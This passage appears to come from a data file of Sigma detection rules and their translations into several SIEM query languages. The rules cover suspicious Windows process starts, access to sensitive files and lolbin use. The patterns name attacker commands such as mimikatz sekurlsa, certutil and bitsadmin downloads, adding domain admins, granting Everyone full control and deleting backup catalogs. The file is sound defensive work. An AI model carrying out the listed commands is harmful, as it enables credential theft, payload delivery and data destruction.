*.vba'\n            - '*\\wscript.exe *.vbe'\n            - '*\\cscript.exe *.jse'\n            - '*\\cscript.exe *.js'\n            - '*\\cscript.exe *.vba'\n            - '*\\cscript.exe *.vbe'\n            - '*\\fodhelper.exe'\n            - '*waitfor*/s*'\n            - '*waitfor*/si persist*'\n            - '*remote*/s*'\n            - '*remote*/c*'\n            - '*remote*/q*'\n            - '*AddInProcess*'\n            - '* /stext *'\n            - '* /scomma *'\n            - '* /stab *'\n            - '* /stabular *'\n            - '* /shtml *'\n            - '* /sverhtml *'\n            - '* /sxml *'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ sekurlsa\\\\:* OR net\\\\ localgroup\\\\ administrators\\\\ *\\\\ \\\\/add OR net\\\\ group\\\\ \\\\\"Domain\\\\ Admins\\\\\"\\\\ *\\\\ \\\\/ADD\\\\ \\\\/DOMAIN OR certutil.exe\\\\ *\\\\-urlcache*\\\\ http* OR certutil.exe\\\\ *\\\\-urlcache*\\\\ ftp* OR netsh\\\\ advfirewall\\\\ firewall\\\\ *\\\\\\\\AppData\\\\\\\\* OR attrib\\\\ \\\\+S\\\\ \\\\+H\\\\ \\\\+R\\\\ *\\\\\\\\AppData\\\\\\\\* OR schtasks*\\\\ \\\\/create\\\\ *\\\\\\\\AppData\\\\\\\\* OR schtasks*\\\\ \\\\/sc\\\\ minute* OR *\\\\\\\\Regasm.exe\\\\ *\\\\\\\\AppData\\\\\\\\* OR *\\\\\\\\Regasm\\\\ *\\\\\\\\AppData\\\\\\\\* OR *\\\\\\\\bitsadmin*\\\\ \\\\/transfer* OR *\\\\\\\\certutil.exe\\\\ *\\\\ \\\\-decode\\\\ * OR *\\\\\\\\certutil.exe\\\\ *\\\\ \\\\-decodehex\\\\ * OR *\\\\\\\\certutil.exe\\\\ \\\\-ping\\\\ * OR icacls\\\\ *\\\\ \\\\/grant\\\\ Everyone\\\\:F\\\\ \\\\/T\\\\ \\\\/C\\\\ \\\\/Q OR *\\\\ wbadmin.exe\\\\ delete\\\\ catalog\\\\ \\\\-quiet* OR *\\\\\\\\wscript.exe\\\\ *.jse OR *\\\\\\\\wscript.exe\\\\ *.js OR *\\\\\\\\wscript.exe\\\\ *.vba OR *\\\\\\\\wscript.exe\\\\ *.vbe OR *\\\\\\\\cscript.exe\\\\ *.jse OR *\\\\\\\\cscript.exe\\\\ *.js OR *\\\\\\\\cscript.exe\\\\ *.vba OR *\\\\\\\\cscript.exe\\\\ *.vbe OR *\\\\\\\\fodhelper.exe OR *waitfor*\\\\/s* OR *waitfor*\\\\/si\\\\ persist* OR *remote*\\\\/s* OR *remote*\\\\/c* OR *remote*\\\\/q* OR *AddInProcess* OR *\\\\ \\\\/stext\\\\ * OR *\\\\ \\\\/scomma\\\\ * OR *\\\\ \\\\/stab\\\\ * OR *\\\\ \\\\/stabular\\\\ * OR *\\\\ \\\\/shtml\\\\ * OR *\\\\ \\\\/sverhtml\\\\ * OR *\\\\ \\\\/sxml\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Process-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Process Creation\",\\n    \"description\": \"Detects suspicious process starts on Windows systems based on keywords\",\\n    \"tags\": [\\n      \"car.2013-07-001\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ sekurlsa\\\\\\\\:* OR net\\\\\\\\ localgroup\\\\\\\\ administrators\\\\\\\\ *\\\\\\\\ \\\\\\\\/add OR net\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"Domain\\\\\\\\ Admins\\\\\\\\\\\\\"\\\\\\\\ *\\\\\\\\ \\\\\\\\/ADD\\\\\\\\ \\\\\\\\/DOMAIN OR certutil.exe\\\\\\\\ *\\\\\\\\-urlcache*\\\\\\\\ http* OR certutil.exe\\\\\\\\ *\\\\\\\\-urlcache*\\\\\\\\ ftp* OR netsh\\\\\\\\ advfirewall\\\\\\\\ firewall\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR attrib\\\\\\\\ \\\\\\\\+S\\\\\\\\ \\\\\\\\+H\\\\\\\\ \\\\\\\\+R\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR schtasks*\\\\\\\\ \\\\\\\\/create\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR schtasks*\\\\\\\\ \\\\\\\\/sc\\\\\\\\ minute* OR *\\\\\\\\\\\\\\\\Regasm.exe\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Regasm\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\bitsadmin*\\\\\\\\ \\\\\\\\/transfer* OR *\\\\\\\\\\\\\\\\certutil.exe\\\\\\\\ *\\\\\\\\ \\\\\\\\-decode\\\\\\\\ * OR *\\\\\\\\\\\\\\\\certutil.exe\\\\\\\\ *\\\\\\\\ \\\\\\\\-decodehex\\\\\\\\ * OR *\\\\\\\\\\\\\\\\certutil.exe\\\\\\\\ \\\\\\\\-ping\\\\\\\\ * OR icacls\\\\\\\\ *\\\\\\\\ \\\\\\\\/grant\\\\\\\\ Everyone\\\\\\\\:F\\\\\\\\ \\\\\\\\/T\\\\\\\\ \\\\\\\\/C\\\\\\\\ \\\\\\\\/Q OR *\\\\\\\\ wbadmin.exe\\\\\\\\ delete\\\\\\\\ catalog\\\\\\\\ \\\\\\\\-quiet* OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.jse OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.js OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.vba OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.vbe OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.jse OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.js OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.vba OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.vbe OR *\\\\\\\\\\\\\\\\fodhelper.exe OR *waitfor*\\\\\\\\/s* OR *waitfor*\\\\\\\\/si\\\\\\\\ persist* OR *remote*\\\\\\\\/s* OR *remote*\\\\\\\\/c* OR *remote*\\\\\\\\/q* OR *AddInProcess* OR *\\\\\\\\ \\\\\\\\/stext\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/scomma\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/stab\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/stabular\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/shtml\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/sverhtml\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/sxml\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ sekurlsa\\\\\\\\:* OR net\\\\\\\\ localgroup\\\\\\\\ administrators\\\\\\\\ *\\\\\\\\ \\\\\\\\/add OR net\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"Domain\\\\\\\\ Admins\\\\\\\\\\\\\"\\\\\\\\ *\\\\\\\\ \\\\\\\\/ADD\\\\\\\\ \\\\\\\\/DOMAIN OR certutil.exe\\\\\\\\ *\\\\\\\\-urlcache*\\\\\\\\ http* OR certutil.exe\\\\\\\\ *\\\\\\\\-urlcache*\\\\\\\\ ftp* OR netsh\\\\\\\\ advfirewall\\\\\\\\ firewall\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR attrib\\\\\\\\ \\\\\\\\+S\\\\\\\\ \\\\\\\\+H\\\\\\\\ \\\\\\\\+R\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR schtasks*\\\\\\\\ \\\\\\\\/create\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR schtasks*\\\\\\\\ \\\\\\\\/sc\\\\\\\\ minute* OR *\\\\\\\\\\\\\\\\Regasm.exe\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Regasm\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\bitsadmin*\\\\\\\\ \\\\\\\\/transfer* OR *\\\\\\\\\\\\\\\\certutil.exe\\\\\\\\ *\\\\\\\\ \\\\\\\\-decode\\\\\\\\ * OR *\\\\\\\\\\\\\\\\certutil.exe\\\\\\\\ *\\\\\\\\ \\\\\\\\-decodehex\\\\\\\\ * OR *\\\\\\\\\\\\\\\\certutil.exe\\\\\\\\ \\\\\\\\-ping\\\\\\\\ * OR icacls\\\\\\\\ *\\\\\\\\ \\\\\\\\/grant\\\\\\\\ Everyone\\\\\\\\:F\\\\\\\\ \\\\\\\\/T\\\\\\\\ \\\\\\\\/C\\\\\\\\ \\\\\\\\/Q OR *\\\\\\\\ wbadmin.exe\\\\\\\\ delete\\\\\\\\ catalog\\\\\\\\ \\\\\\\\-quiet* OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.jse OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.js OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.vba OR *\\\\\\\\\\\\\\\\wscript.exe\\\\\\\\ *.vbe OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.jse OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.js OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.vba OR *\\\\\\\\\\\\\\\\cscript.exe\\\\\\\\ *.vbe OR *\\\\\\\\\\\\\\\\fodhelper.exe OR *waitfor*\\\\\\\\/s* OR *waitfor*\\\\\\\\/si\\\\\\\\ persist* OR *remote*\\\\\\\\/s* OR *remote*\\\\\\\\/c* OR *remote*\\\\\\\\/q* OR *AddInProcess* OR *\\\\\\\\ \\\\\\\\/stext\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/scomma\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/stab\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/stabular\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/shtml\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/sverhtml\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/sxml\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Process Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* sekurlsa\\\\:* net localgroup administrators * \\\\/add net group \\\\\"Domain Admins\\\\\" * \\\\/ADD \\\\/DOMAIN certutil.exe *\\\\-urlcache* http* certutil.exe *\\\\-urlcache* ftp* netsh advfirewall firewall *\\\\\\\\AppData\\\\\\\\* attrib \\\\+S \\\\+H \\\\+R *\\\\\\\\AppData\\\\\\\\* schtasks* \\\\/create *\\\\\\\\AppData\\\\\\\\* schtasks* \\\\/sc minute* *\\\\\\\\Regasm.exe *\\\\\\\\AppData\\\\\\\\* *\\\\\\\\Regasm *\\\\\\\\AppData\\\\\\\\* *\\\\\\\\bitsadmin* \\\\/transfer* *\\\\\\\\certutil.exe * \\\\-decode * *\\\\\\\\certutil.exe * \\\\-decodehex * *\\\\\\\\certutil.exe \\\\-ping * icacls * \\\\/grant Everyone\\\\:F \\\\/T \\\\/C \\\\/Q * wbadmin.exe delete catalog \\\\-quiet* *\\\\\\\\wscript.exe *.jse *\\\\\\\\wscript.exe *.js *\\\\\\\\wscript.exe *.vba *\\\\\\\\wscript.exe *.vbe *\\\\\\\\cscript.exe *.jse *\\\\\\\\cscript.exe *.js *\\\\\\\\cscript.exe *.vba *\\\\\\\\cscript.exe *.vbe *\\\\\\\\fodhelper.exe *waitfor*\\\\/s* *waitfor*\\\\/si persist* *remote*\\\\/s* *remote*\\\\/c* *remote*\\\\/q* *AddInProcess* * \\\\/stext * * \\\\/scomma * * \\\\/stab * * \\\\/stabular * * \\\\/shtml * * \\\\/sverhtml * * \\\\/sxml *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* sekurlsa:*\" OR CommandLine=\"net localgroup administrators * /add\" OR CommandLine=\"net group \\\\\"Domain Admins\\\\\" * /ADD /DOMAIN\" OR CommandLine=\"certutil.exe *-urlcache* http*\" OR CommandLine=\"certutil.exe *-urlcache* ftp*\" OR CommandLine=\"netsh advfirewall firewall *\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"attrib +S +H +R *\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"schtasks* /create *\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"schtasks* /sc minute*\" OR CommandLine=\"*\\\\\\\\Regasm.exe *\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"*\\\\\\\\Regasm *\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"*\\\\\\\\bitsadmin* /transfer*\" OR CommandLine=\"*\\\\\\\\certutil.exe * -decode *\" OR CommandLine=\"*\\\\\\\\certutil.exe * -decodehex *\" OR CommandLine=\"*\\\\\\\\certutil.exe -ping *\" OR CommandLine=\"icacls * /grant Everyone:F /T /C /Q\" OR CommandLine=\"* wbadmin.exe delete catalog -quiet*\" OR CommandLine=\"*\\\\\\\\wscript.exe *.jse\" OR CommandLine=\"*\\\\\\\\wscript.exe *.js\" OR CommandLine=\"*\\\\\\\\wscript.exe *.vba\" OR CommandLine=\"*\\\\\\\\wscript.exe *.vbe\" OR CommandLine=\"*\\\\\\\\cscript.exe *.jse\" OR CommandLine=\"*\\\\\\\\cscript.exe *.js\" OR CommandLine=\"*\\\\\\\\cscript.exe *.vba\" OR CommandLine=\"*\\\\\\\\cscript.exe *.vbe\" OR CommandLine=\"*\\\\\\\\fodhelper.exe\" OR CommandLine=\"*waitfor*/s*\" OR CommandLine=\"*waitfor*/si persist*\" OR CommandLine=\"*remote*/s*\" OR CommandLine=\"*remote*/c*\" OR CommandLine=\"*remote*/q*\" OR CommandLine=\"*AddInProcess*\" OR CommandLine=\"* /stext *\" OR CommandLine=\"* /scomma *\" OR CommandLine=\"* /stab *\" OR CommandLine=\"* /stabular *\" OR CommandLine=\"* /shtml *\" OR CommandLine=\"* /sverhtml *\" OR CommandLine=\"* /sxml *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* sekurlsa:*\", \"net localgroup administrators * /add\", \"net group \\\\\"Domain Admins\\\\\" * /ADD /DOMAIN\", \"certutil.exe *-urlcache* http*\", \"certutil.exe *-urlcache* ftp*\", \"netsh advfirewall firewall *\\\\\\\\AppData\\\\\\\\*\", \"attrib +S +H +R *\\\\\\\\AppData\\\\\\\\*\", \"schtasks* /create *\\\\\\\\AppData\\\\\\\\*\", \"schtasks* /sc minute*\", \"*\\\\\\\\Regasm.exe *\\\\\\\\AppData\\\\\\\\*\", \"*\\\\\\\\Regasm *\\\\\\\\AppData\\\\\\\\*\", \"*\\\\\\\\bitsadmin* /transfer*\", \"*\\\\\\\\certutil.exe * -decode *\", \"*\\\\\\\\certutil.exe * -decodehex *\", \"*\\\\\\\\certutil.exe -ping *\", \"icacls * /grant Everyone:F /T /C /Q\", \"* wbadmin.exe delete catalog -quiet*\", \"*\\\\\\\\wscript.exe *.jse\", \"*\\\\\\\\wscript.exe *.js\", \"*\\\\\\\\wscript.exe *.vba\", \"*\\\\\\\\wscript.exe *.vbe\", \"*\\\\\\\\cscript.exe *.jse\", \"*\\\\\\\\cscript.exe *.js\", \"*\\\\\\\\cscript.exe *.vba\", \"*\\\\\\\\cscript.exe *.vbe\", \"*\\\\\\\\fodhelper.exe\", \"*waitfor*/s*\", \"*waitfor*/si persist*\", \"*remote*/s*\", \"*remote*/c*\", \"*remote*/q*\", \"*AddInProcess*\", \"* /stext *\", \"* /scomma *\", \"* /stab *\", \"* /stabular *\", \"* /shtml *\", \"* /sverhtml *\", \"* /sxml *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*.* sekurlsa:.*|.*net localgroup administrators .* /add|.*net group \"Domain Admins\" .* /ADD /DOMAIN|.*certutil\\\\.exe .*-urlcache.* http.*|.*certutil\\\\.exe .*-urlcache.* ftp.*|.*netsh advfirewall firewall .*\\\\AppData\\\\\\\\.*|.*attrib \\\\+S \\\\+H \\\\+R .*\\\\AppData\\\\\\\\.*|.*schtasks.* /create .*\\\\AppData\\\\\\\\.*|.*schtasks.* /sc minute.*|.*.*\\\\Regasm\\\\.exe .*\\\\AppData\\\\\\\\.*|.*.*\\\\Regasm .*\\\\AppData\\\\\\\\.*|.*.*\\\\bitsadmin.* /transfer.*|.*.*\\\\certutil\\\\.exe .* -decode .*|.*.*\\\\certutil\\\\.exe .* -decodehex .*|.*.*\\\\certutil\\\\.exe -ping .*|.*icacls .* /grant Everyone:F /T /C /Q|.*.* wbadmin\\\\.exe delete catalog -quiet.*|.*.*\\\\wscript\\\\.exe .*\\\\.jse|.*.*\\\\wscript\\\\.exe .*\\\\.js|.*.*\\\\wscript\\\\.exe .*\\\\.vba|.*.*\\\\wscript\\\\.exe .*\\\\.vbe|.*.*\\\\cscript\\\\.exe .*\\\\.jse|.*.*\\\\cscript\\\\.exe .*\\\\.js|.*.*\\\\cscript\\\\.exe .*\\\\.vba|.*.*\\\\cscript\\\\.exe .*\\\\.vbe|.*.*\\\\fodhelper\\\\.exe|.*.*waitfor.*/s.*|.*.*waitfor.*/si persist.*|.*.*remote.*/s.*|.*.*remote.*/c.*|.*.*remote.*/q.*|.*.*AddInProcess.*|.*.* /stext .*|.*.* /scomma .*|.*.* /stab .*|.*.* /stabular .*|.*.* /shtml .*|.*.* /sverhtml .*|.*.* /sxml .*)\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious access to sensitive file extensions\nid: 91c945bc-2ad1-4799-a591-4d00198a1215\ndescription: Detects known sensitive file extensions\nauthor: Samir Bousseaden\ntags:\n    - attack.collection\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 5145\n        RelativeTargetName:\n            - '*.pst'\n            - '*.ost'\n            - '*.msg'\n            - '*.nst'\n            - '*.oab'\n            - '*.edb'\n            - '*.nsf' \n            - '*.bak'\n            - '*.dmp'\n            - '*.kirbi'\n            - '*\\groups.xml'\n            - '*.rdp'\n    condition: selection\nfalsepositives:\n    - Help Desk operator doing backup or re-imaging end user machine or pentest or backup software\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"5145\") AND RelativeTargetName.keyword:(*.pst OR *.ost OR *.msg OR *.nst OR *.oab OR *.edb OR *.nsf OR *.bak OR *.dmp OR *.kirbi OR *\\\\\\\\groups.xml OR *.rdp))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-access-to-sensitive-file-extensions <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious access to sensitive file extensions\",\\n    \"description\": \"Detects known sensitive file extensions\",\\n    \"tags\": [\\n      \"attack.collection\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"5145\\\\\") AND RelativeTargetName.keyword:(*.pst OR *.ost OR *.msg OR *.nst OR *.oab OR *.edb OR *.nsf OR *.bak OR *.dmp OR *.kirbi OR *\\\\\\\\\\\\\\\\groups.xml OR *.rdp))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"5145\\\\\") AND RelativeTargetName.keyword:(*.pst OR *.ost OR *.msg OR *.nst OR *.oab OR *.edb OR *.nsf OR *.bak OR *.dmp OR *.kirbi OR *\\\\\\\\\\\\\\\\groups.xml OR *.rdp))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious access to sensitive file extensions\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"5145\") AND RelativeTargetName.keyword:(*.pst *.ost *.msg *.nst *.oab *.edb *.nsf *.bak *.dmp *.kirbi *\\\\\\\\groups.xml *.rdp))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5145\") (RelativeTargetName=\"*.pst\" OR RelativeTargetName=\"*.ost\" OR RelativeTargetName=\"*.msg\" OR RelativeTargetName=\"*.nst\" OR RelativeTargetName=\"*.oab\" OR RelativeTargetName=\"*.edb\" OR RelativeTargetName=\"*.nsf\" OR RelativeTargetName=\"*.bak\" OR RelativeTargetName=\"*.dmp\" OR RelativeTargetName=\"*.kirbi\" OR RelativeTargetName=\"*\\\\\\\\groups.xml\" OR RelativeTargetName=\"*.rdp\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"5145\"] RelativeTargetName IN [\"*.pst\", \"*.ost\", \"*.msg\", \"*.nst\", \"*.oab\", \"*.edb\", \"*.nsf\", \"*.bak\", \"*.dmp\", \"*.kirbi\", \"*\\\\\\\\groups.xml\", \"*.rdp\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*5145))(?=.*(?:.*.*\\\\.pst|.*.*\\\\.ost|.*.*\\\\.msg|.*.*\\\\.nst|.*.*\\\\.oab|.*.*\\\\.edb|.*.*\\\\.nsf|.*.*\\\\.bak|.*.*\\\\.dmp|.*.*\\\\.kirbi|.*.*\\\\groups\\\\.xml|.*.*\\\\.rdp)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Squirrel Lolbin\nid: fa4b21c9-0057-4493-b289-2556416ae4d7\nstatus: experimental\ndescription: Detects Possible Squirrel Packages Manager as Lolbin\nreferences:\n    - http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/\n    - http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/\ntags:\n    - attack.execution\nauthor: Karneades / Markus Neis\nfalsepositives:\n    - 1Clipboard\n    - Beaker Browser\n    - Caret\n    - Collectie\n    - Discord\n    - Figma\n    - Flow\n    - Ghost\n    - GitHub Desktop\n    - GitKraken\n    - Hyper\n    - Insomnia\n    - JIBO\n    - Kap\n    - Kitematic\n    - Now Desktop\n    - Postman\n    - PostmanCanary\n    - Rambox\n    - Simplenote\n    - Skype\n    - Slack\n    - SourceTree\n    - Stride\n    - Svgsus\n    - WebTorrent\n    - WhatsApp\n    - WordPress.com\n    - atom\n    - gitkraken\n    - slack\n    - teams\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\update.exe'                           # Check if folder Name matches executed binary  \\\\(?P<first>[^\\\\]*)\\\\Update.*Start.{2}(?P<second>\\1)\\.exe (example: https://regex101.com/r/SGSQGz/2)\n        CommandLine:\n            - '*--processStart*.exe*'\n            - '*--processStartAndWait*.exe*'\n            - '*\u2013createShortcut*.exe*'\n    condition: selection", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\update.exe) AND CommandLine.keyword:(*\\\\-\\\\-processStart*.exe* OR *\\\\-\\\\-processStartAndWait*.exe* OR *\\xe2\\x80\\x93createShortcut*.exe*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Squirrel-Lolbin <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Squirrel Lolbin\",\\n    \"description\": \"Detects Possible Squirrel Packages Manager as Lolbin\",\\n    \"tags\": [\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\update.exe) AND CommandLine.keyword:(*\\\\\\\\-\\\\\\\\-processStart*.exe* OR *\\\\\\\\-\\\\\\\\-processStartAndWait*.exe* OR *\\\\u2013createShortcut*.exe*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\update.exe) AND CommandLine.keyword:(*\\\\\\\\-\\\\\\\\-processStart*.exe* OR *\\\\\\\\-\\\\\\\\-processStartAndWait*.exe* OR *\\\\u2013createShortcut*.exe*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Squirrel Lolbin\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\update.exe) AND CommandLine.keyword:(*\\\\-\\\\-processStart*.exe* *\\\\-\\\\-processStartAndWait*.exe* *\\xe2\\x80\\x93createShortcut*.exe*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\update.exe\") (CommandLine=\"*--processStart*.exe*\" OR CommandLine=\"*--processStartAndWait*.exe*\" OR CommandLine=\"*\\xe2\\x80\\x93createShortcut*.exe*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\update.exe\"] CommandLine IN [\"*--processStart*.exe*\", \"*--processStartAndWait*.exe*\", \"*\\xe2\\x80\\x93createShortcut*.exe*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\update\\\\.exe))(?=.*(?:.*.*--processStart.*\\\\.exe.*|.*.*--processStartAndWait.*\\\\.exe.*|.*.*\\xe2\\x80\\x93createShortcut.*\\\\.exe.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Sysprep on AppData Folder\nid: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e\nstatus: experimental\ndescription: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan 